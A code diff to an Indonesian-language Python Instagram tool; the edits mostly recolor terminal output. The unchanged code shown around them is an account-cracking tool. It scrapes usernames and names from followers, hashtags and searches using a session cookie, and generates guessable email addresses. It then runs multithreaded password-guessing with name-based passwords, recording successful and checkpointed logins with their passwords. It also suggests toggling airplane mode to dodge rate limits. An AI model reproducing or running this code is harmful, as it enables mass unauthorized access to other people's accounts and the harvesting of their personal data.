@@ -99,7 +99,7 @@ def ___menu___():
     except (KeyError):
         print(f"{A}╚═➣{M} COOKIE INVALID !!!");os.system('rm -rf Data/coki.txt && rm -rf Data/user.txt');sleep(3);___login___()
     except (IOError):
-        exit(f"{T}[{J}!{T}]{J} Connection Error")
+        exit(f"{A}[{J}!{A}]{J} Connection Error")
     print(f"{A}╔════════════════════════════════════════════════════════════════════════════════════════╗")
     print(f"{A}║                                           {J}║                                            {A}║")
     print(f"{A}║ {A}[{J}1{A}]{A} Dump Username From {H}Following          {J}║  {A}[{J}7{A}]{A} Dump Username From {H}Query              {A}║")
@@ -163,41 +163,41 @@ def ___mengikuti___():
             for z in ___zak['users']:
                 open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                 print(f"{A}{z['username']}<=>{z['full_name']}")
-            print(f"\n{T}[{Z}*{T}]{H} Finished...")
-            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
-            input(f"{T}[{J}Return{T}]{A}");___menu___()
+            print(f"\n{A}[{J}*{A}]{H} Finished...")
+            print(f"{A}[{H}?{A}]{J} File Saved In :{H} Dump/{___file}")
+            input(f"{A}[{J}Return{A}]{H}");___menu___()
     except (KeyError):
-        print(f"{T}[{M}!{T}]{M} Dump Fail");sleep(2);___menu___()
+        print(f"{A}[{M}!{A}]{M} Dump Fail");sleep(2);___menu___()
     except (ConnectionError):
-        exit(f"{T}[{M}!{T}]{M} Connection Error")
+        exit(f"{A}[{M}!{A}]{M} Connection Error")
 # Dump Pengikut
 def ___pengikut___():
     try:
-        ___user = input(f"\n{T}[{Z}?{T}]{B} User :{U} ")
+        ___user = input(f"\n{A}[{H}?{A}]{J} User :{H} ")
         if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
-            exit(f"{T}[{M}!{T}]{M} use Username")
+            exit(f"{A}[{M}!{A}]{M} use Username")
         else:
             ___roz = requests.get(f'https://i.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
-            print(f"{T}[{A}?{T}]{Z} Name :{J} {___roz['full_name']}\n")
+            print(f"{A}[{H}?{A}]{J} Name :{H} {___roz['full_name']}\n")
             ___file = (___roz['full_name'].replace(' ','_')+'.txt')
         with requests.Session() as ses:
             ___zak = ses.get(f'https://i.instagram.com/api/v1/friendships/{___roz["id"]}/followers/?count=5000', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
             for z in ___zak['users']:
                 open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                 print(f"{A}{z['username']}<=>{z['full_name']}")
-            print(f"\n{T}[{Z}*{T}]{H} Finished...")
-            print(f"{T}[{Z}?{T}]{B} File Saved in :{U} Dump/{___file}")
-            input(f"{T}[{J}Return{T}]{A}");___menu___()
+            print(f"\n{A}[{J}*{A}]{H} Finished...")
+            print(f"{A}[{H}?{A}]{J} File Saved in :{H} Dump/{___file}")
+            input(f"{A}[{J}Return{A}]{H}");___menu___()
     except (KeyError):
-        exit(f"{T}[{M}!{T}]{M} Dump Failed")
+        exit(f"{A}[{M}!{A}]{M} Dump Failed")
     except (ConnectionError):
-        exit(f"{T}[{M}!{T}]{M} Connection Error")
+        exit(f"{A}[{M}!{A}]{M} Connection Error")
 # Dump Activity
 def ___activity___():
     try:
-        ___file = input(f"\n{T}[{Z}?{T}]{B} Name File :{U} ").replace(' ','_')
+        ___file = input(f"\n{A}[{H}?{A}]{J} Name File :{H} ").replace(' ','_')
         if ___file in ['',' ']:
-            exit(f"{T}[{M}!{T}]{M} Fill")
+            exit(f"{A}[{M}!{A}]{M} Fill")
         else:
             print(f"{A} ")
             ___roz = requests.get('https://z-p42.www.instagram.com/accounts/activity/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
@@ -205,39 +205,39 @@ def ___activity___():
             for z in ___zak:
                 open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                 print(f"{z[0]}<=>{z[1]}")
-            print(f"\n{T}[{Z}*{T}]{H} Finisehd...")
-            print(f"{T}[{Z}?{T}]{B} File Saved in :{U} Dump/{___file}")
-            input(f"{T}[{J}Return{T}]{A}");___menu___()
+            print(f"\n{A}[{J}*{A}]{H} Finisehd...")
+            print(f"{A}[{H}?{A}]{B} File Saved in :{U} Dump/{___file}")
+            input(f"{A}[{J}Return{A}]{H}");___menu___()
     except Exception as e:
-        exit(f"{T}[{M}!{T}]{M} {e}")
+        exit(f"{A}[{M}!{A}]{M} {e}")
 # Dump Beranda
 def ___beranda___():
     try:
-        ___file = input(f"\n{T}[{Z}?{T}]{B} Name File :{U} ").replace(' ','_')
+        ___file = input(f"\n{A}[{H}?{A}]{J} Name File :{H} ").replace(' ','_')
         if ___file in ['',' ']:
-            exit(f"{T}[{M}!{T}]{M} Fill")
+            exit(f"{A}[{M}!{A}]{M} Fill")
         else:
             print(f"{A} ")
             ___roz = requests.get('https://i.instagram.com/api/v1/feed/reels_tray/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
             for z in ___roz['tray']:
                 open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                 print(f"{z['user']['username']}<=>{z['user']['full_name']}")
-            print(f"\n{T}[{Z}*{T}]{H} Finished...")
-            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
-            input(f"{T}[{J}Return{T}]{A}");___menu___()
+            print(f"\n{A}[{J}*{A}]{H} Finished...")
+            print(f"{A}[{H}?{A}]{J} File Saved In :{H} Dump/{___file}")
+            input(f"{A}[{J}Return{A}]{H}");___menu___()
     except (KeyError):
-        exit(f"{T}[{M}!{T}]{M} Dump Failed")
+        exit(f"{A}[{M}!{A}]{M} Dump Failed")
     except (ConnectionError):
-        exit(f"{T}[{M}!{T}]{J} Connection Error")
+        exit(f"{A}[{M}!{A}]{J} Connection Error")
 # Dump Hastag
 def ___hastag___():
     try:
-        ___tag = input(f"\n{T}[{Z}?{T}]{B} Hashtag :{U} ").replace('#','')
+        ___tag = input(f"\n{A}[{H}?{A}]{J} Hashtag :{H} ").replace('#','')
         if ___tag in ['',' ']:
-            exit(f"{T}[{M}!{T}]{M} Fill")
-        ___file = input(f"{T}[{Z}?{T}]{U} Name File :{B} ").replace(' ','_')
+            exit(f"{A}[{M}!{A}]{M} Fill")
+        ___file = input(f"{A}[{H}?{A}]{J} Name File :{H} ").replace(' ','_')
         if ___file in ['',' ']:
-            exit(f"{T}[{M}!{T}]{M} Fill")
+            exit(f"{A}[{M}!{A}]{M} Fill")
         else:
             print(f"{A} ")
             ___roz = requests.get(f'https://z-p42.www.instagram.com/explore/tags/{___tag}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()})
@@ -245,39 +245,39 @@ def ___hastag___():
             for z in ___zak:
                 open('Dump/'+___file, 'a').write(z[0]+'<=>'+z[1]+'\n')
                 print(f"{z[0]}<=>{z[1]}")
-            print(f"\n{T}[{Z}*{T}]{H} Finished...")
-            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
-            input(f"{T}[{J}Return{T}]{A}");___menu___()
+            print(f"\n{A}[{J}*{A}]{H} Finished...")
+            print(f"{A}[{H}?{A}]{J} File Saved In :{H} Dump/{___file}")
+            input(f"{A}[{J}Return{A}]{H}");___menu___()
     except Exception as e:
-        exit(f"{T}[{M}!{T}]{J} {e}")
+        exit(f"{A}[{M}!{A}]{J} {e}")
 # Dump Search
 def ___search___():
     try:
-        ___user = input(f"\n{T}[{Z}?{T}]{B} User :{U} ")
+        ___user = input(f"\n{A}[{H}?{A}]{J} User :{H} ")
         if ___user[:1] in ['1','2','3','4','5','6','7','8','9','0']:
-            exit(f"{T}[{M}!{T}]{M} Use Username")
+            exit(f"{A}[{M}!{A}]{M} Use Username")
         else:
             ___roz = requests.get(f'https://z-p42.www.instagram.com/{___user}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
-            print(f"{T}[{Z}?{T}]{B} Name :{U} {___roz['full_name']}\n")
+            print(f"{A}[{H}?{A}]{B} Name :{H} {___roz['full_name']}\n")
             ___file = (___roz['full_name'].replace(' ','_')+'.txt')
         with requests.Session() as ses:
             ___zak = ses.get(f'https://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id={___roz["id"]}&include_friendship_status=true', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()
             for z in ___zak['users']:
                 open('Dump/'+___file, 'a').write(z['username']+'<=>'+z['full_name']+'\n')
                 print(f"{P}{z['username']}<=>{z['full_name']}")
-            print(f"\n{T}[{Z}*{T}]{H} Finished...")
-            print(f"{T}[{Z}?{T}]{B} File Saved In :{U} Dump/{___file}")
-            input(f"{T}[{J}Return{T}]{A}");___menu___()
+            print(f"\n{A}[{J}*{A}]{H} Finished...")
+            print(f"{A}[{H}?{A}]{J} File Saved In :{H} Dump/{___file}")
+            input(f"{A}[{J}Return{A}]{H}");___menu___()
     except (KeyError):
-        exit(f"{T}[{M}!{T}]{M} Dump Failed")
+        exit(f"{A}[{M}!{A}]{M} Dump Failed")
     except (ConnectionError):
-        exit(f"{T}[{M}!{T}]{J} Connection Error")
+        exit(f"{A}[{M}!{A}]{J} Connection Error")
 # Dump Query
 def ___query___():
     try:
-        ___query = input(f"\n{T}[{Z}?{T}]{B} Query :{U} ")
+        ___query = input(f"\n{A}[{H}?{A}]{J} Query :{H} ")
         if ___query in ['',' ']:
-            exit(f"{T}[{M}!{T}]{M} Fill")
+            exit(f"{A}[{M}!{A}]{M} Fill")
         else:
             print(f"{A} ")
             ___file = ___query.replace(' ','_')+'.txt'
@@ -285,24 +285,24 @@ def ___query___():
             for z in ___roz['users']:
                 open('Dump/'+___file, 'a').write(z['user']['username']+'<=>'+z['user']['full_name']+'\n')
                 print(f"{z['user']['username']}<=>{z['user']['full_name']}")
-            print(f"\n{T}[{Z}*{T}]{H} Finished...")
-            print(f"{T}[{Z}?{T}]{B} File Saved in :{U} Dump/{___file}")
-            input(f"{T}[{J}Return{T}]{A}");___menu___()
+            print(f"\n{A}[{J}*{A}]{H} Finished...")
+            print(f"{A}[{H}?{A}]{J} File Saved in :{H} Dump/{___file}")
+            input(f"{A}[{J}Return{A}]{H}");___menu___()
     except (KeyError):
-        exit(f"{T}[{M}!{T}]{M} Dump Failed")
+        exit(f"{A}[{M}!{A}]{M} Dump Failed")
     except (ConnectionError):
-        exit(f"{T}[{M}!{T}]{J} Connection Error")
+        exit(f"{A}[{M}!{A}]{J} Connection Error")
 # Dump Dari Email
 def ___email___():
     try:
-        ___nama = input(f"\n{T}[{Z}?{T}]{B} Name :{U} ").replace(' ','')
+        ___nama = input(f"\n{A}[{H}?{A}]{J} Name :{H} ").replace(' ','')
         if ___nama in ['',' ']:
-            exit(f"{T}[{M}!{T}]{M} Fill")
-        ___domain = input(f"{T}[{Z}?{T}]{B} Domain :{U} ")
+            exit(f"{A}[{M}!{A}]{M} Fill")
+        ___domain = input(f"{A}[{H}?{A}]{J} Domain :{H} ")
         if ___domain in ['@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com']:
-            ___limit = int(input(f"{T}[{Z}?{T}]{J} Limit :{A} "))
+            ___limit = int(input(f"{A}[{H}?{A}]{J} Limit :{H} "))
             if ___limit >=1001:
-                exit(f"{T}[{J}!{T}]{M} maximun 1000")
+                exit(f"{A}[{M}!{A}]{M} maximun 1000")
             else:
                 print(f"{A} ")
                 ___file = 'Dump/'+___nama+'.txt'
@@ -311,13 +311,13 @@ def ___email___():
                     ___user = ___nama + str(___nomor) + ___domain + '<=>' + ___nama + ' ' + str(___nomor)
                     open(___file, 'a').write(f'{___user}\n')
                     print(f"{___user}")
-                print(f"\n{T}[{Z}*{T}]{H} Finished...")
-                print(f"{T}[{Z}?{T}]{B} File Saved in :{U} {___file}")
-                input(f"{T}[{J}Return{T}]{A}");___menu___()
+                print(f"\n{A}[{J}*{A}]{H} Finished...")
+                print(f"{A}[{H}?{A}]{J} File Saved in :{H} {___file}")
+                input(f"{A}[{J}Return{A}]{H}");___menu___()
         else:
-            exit(f"{T}[{J}!{T}]{J} Domain '@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com'")
+            exit(f"{A}[{M}!{A}]{H} Domain '@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com'")
     except Exception as e:
-        exit(f"{T}[{M}!{T}]{M} {e}")
+        exit(f"{A}[{M}!{A}]{M} {e}")
 # Proxy
 def ___proxy___():
     try:
@@ -334,26 +334,26 @@ class ___crack___:
         self.kill = 0
         self.ok = []
         self.cp = []
-        print(f"{T}╔════════════════════════════════════════════════════════════════════════════════════════╗")
-        print(f"{T}║                                                                                        {T}║")
-        print(f"{T}║ [{Z}1{T}]{U} Enter {B}Password {T}[{H}Name, Name123, Name12345{T}]                                          {T}║")
-        print(f"{T}║ [{Z}2{T}]{U} Enter {B}Password {T}[{H}name, name123, name1234, name12345{T}]                                {T}║")
-        print(f"{T}║ [{Z}3{T}]{U} Enter {B}Password {T}[{M}name, name123, name1234, name12345, name123456{T}]                    {T}║")
-        print(f"{T}║ [{Z}4{T}]{U} Enter {B}Password {H}Manual {T}[{M}>5{T}]                                                         {T}║")
-        print(f"{T}║                                                                                        {T}║")
-        print(f"{T}╚════════════════════════════════════════════════════════════════════════════════════════╝")
-        ___pilih = input(f"{T}║ [{J}?{T}]{J} Choose :{A} ")
+        print(f"{A}╔════════════════════════════════════════════════════════════════════════════════════════╗")
+        print(f"{A}║                                                                                        {A}║")
+        print(f"{A}║ [{J}1{A}]{J} Enter {A}Password {H}[{H}Name, Name123, Name12345{A}]                                          {A}║")
+        print(f"{A}║ [{J}2{A}]{J} Enter {A}Password {H}[{H}name, name123, name1234, name12345{A}]                                {A}║")
+        print(f"{A}║ [{J}3{A}]{J} Enter {A}Password {H}[{M}name, name123, name1234, name12345, name123456{A}]                    {A}║")
+        print(f"{A}║ [{J}4{A}]{J} Enter {A}Password {H}Manual, bismillah, katasandi, cantik123 {A}]                                                         {A}║")
+        print(f"{A}║                                                                                        {A}║")
+        print(f"{A}╚════════════════════════════════════════════════════════════════════════════════════════╝")
+        ___pilih = input(f"{A}║ [{H}?{A}]{J} Choose :{H} ")
         if ___pilih in ['4','04']:
-            pwx = input(f"{T}║ [{J}?{T}]{H} Password :{Z} ").split(',')
+            pwx = input(f"{A}║ [{H}?{A}]{H} Password :{J} ").split(',')
         try:
-            self.___dump = input(f"{T}║ [{J}?{T}]{U} File Dump :{B} ")
+            self.___dump = input(f"{A}║ [{H}?{A}]{J} File Dump :{H} ")
             self.___file = open(self.___dump, 'r').read().splitlines()
         except (IOError):
-            print(f"{T}║ [{M}!{T}]{M} File Not Found");sleep(2);___menu___()
+            print(f"{A}║ [{M}!{A}]{M} File Not Found");sleep(2);___menu___()
         try:
-            print(f"\n{T}║ [{Z}•{T}]{H} Total Ok Saved Di Results/Ok.txt")
-            print(f"{T}║ [{Z}•{T}]{J} Total Cp Saved Di Results/Cp.txt")
-            print(f"{T}║ [{Z}•{T}]{A} JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 10 DETIK {M}!!!\n")
+            print(f"\n{A}║ [{J}•{A}]{H} Total Ok Saved Di Results/Ok.txt")
+            print(f"{A}║ [{J}•{A}]{J} Total Cp Saved Di Results/Cp.txt")
+            print(f"{A}║ [{J}•{A}]{M} JIKA TIDAK ADA HASIL HIDUPKAN MODE PESAWAT 10 DETIK {M}!!!\n")
             with ThreadPoolExecutor(max_workers=30) as (___hayuk):
                 for ___user in self.___file:
                     username, nama = ___user.split('<=>')
@@ -369,9 +369,9 @@ class ___crack___:
                     else:
                         password = [nama.replace(' ',''), nama, z[0]+'123', z[0]+'1234', z[0]+'12345']
                     ___hayuk.submit(self.__main__, self.___file, username, password)
-            exit(f"\n{T}╚═➣ [{H}Finished{T}]{A}")
+            exit(f"\n{A}╚═➣ [{H}Finished{A}]{J}")
         except (ValueError):
-            exit(f"{T}[{M}!{T}]{M} Crack is complete, there seems to be an error, please re-dump!")
+            exit(f"{A}[{M}!{A}]{M} Crack is complete, there seems to be an error, please re-dump!")
     def __main__(self, user, uid, pwx):
         try:
             ___useragent = open('Data/ua2.txt', 'r').read()
@@ -403,11 +403,11 @@ class ___crack___:
                             follower = ('-')
                             following = ('-')
                         except:pass
-                        print(f"\r{T}║ [{H}✔{T}]{A} Status {T}:{H} SUCCESS LOGIN")
-                        print(f"{T}║ [{Z}>{T}]{A} Username {T}:{H} {uid}")
-                        print(f"{T}║ [{Z}>{T}]{A} Password {T}:{H} {pw}")
-                        print(f"{T}║ [{Z}>{T}]{A} Follower {T}:{H} {follower}")
-                        print(f"{T}║ [{Z}>{T}]{A} Following {T}:{H} {following}\n")
+                        print(f"\r{A}║ [{H}✔{A}]{A} Status {A}:{H} SUCCESS LOGIN")
+                        print(f"{A}║ [{H}>{A}]{A} Username {A}:{H} {uid}")
+                        print(f"{A}║ [{H}>{A}]{A} Password {A}:{H} {pw}")
+                        print(f"{A}║ [{H}>{A}]{A} Follower {A}:{H} {follower}")
+                        print(f"{A}║ [{H}>{A}]{A} Following {A}:{H} {following}\n")
                         self.ok.append(f"{uid}|{pw}")
                         open('Results/Ok.txt','a').write(f"{uid}|{pw}\n")
                         break
@@ -420,11 +420,11 @@ class ___crack___:
                             follower = ('-')
                             following = ('-')
                         except:pass
-                        print(f"\r{T}║ [{M}✘{T}]{A} Status {T}:{K} CHECKPOINT LOGIN")
-                        print(f"{T}║ [{Z}>{T}]{A} Username {T}:{K} {uid}")
-                        print(f"{T}║ [{Z}>{T}]{A} Password {T}:{K} {pw}")
-                        print(f"{T}║ [{Z}>{T}]{A} Follower {T}:{K} {follower}")
-                        print(f"{T}║ [{Z}>{T}]{A} Following {T}:{K} {following}\n")
+                        print(f"\r{A}║ [{M}✘{A}]{A} Status {A}:{J} CHECKPOINT LOGIN")
+                        print(f"{A}║ [{J}>{A}]{A} Username {A}:{J} {uid}")
+                        print(f"{A}║ [{J}>{A}]{A} Password {A}:{J} {pw}")
+                        print(f"{A}║ [{J}>{A}]{A} Follower {A}:{J} {follower}")
+                        print(f"{A}║ [{J}>{A}]{A} Following {A}:{J} {following}\n")
                         self.cp.append(f"{uid}|{pw}")
                         open('Results/Cp.txt','a').write(f"{uid}|{pw}\n")
                         break
@@ -433,9 +433,9 @@ class ___crack___:
                     else:
                         continue
             self.kill +=1
-            print(f"{T}╚═➣ [{J}Crack{T}]{A} {self.kill}/{str(len(user))} {J}Cp:-{len(self.cp)} {H}Ok:-{len(self.ok)}          ", end='\r')
+            print(f"{A}╚═➣ [{H}Crack{A}]{H} {self.kill}/{str(len(user))} {J}Cp:-{len(self.cp)} {H}Ok:-{len(self.ok)}          ", end='\r')
         except (ConnectionError):
-            print(f"{T}╚═➣ [{Z}!{T}]{J} connection Error               ", end='\r');sleep(7);__main__(self, user, uid, pwx)
+            print(f"{A}╚═➣ [{M}!{A}]{J} connection Error               ", end='\r');sleep(7);__main__(self, user, uid, pwx)
         except:__main__(self, user, uid, pwx)
 
 if __name__=='__main__':
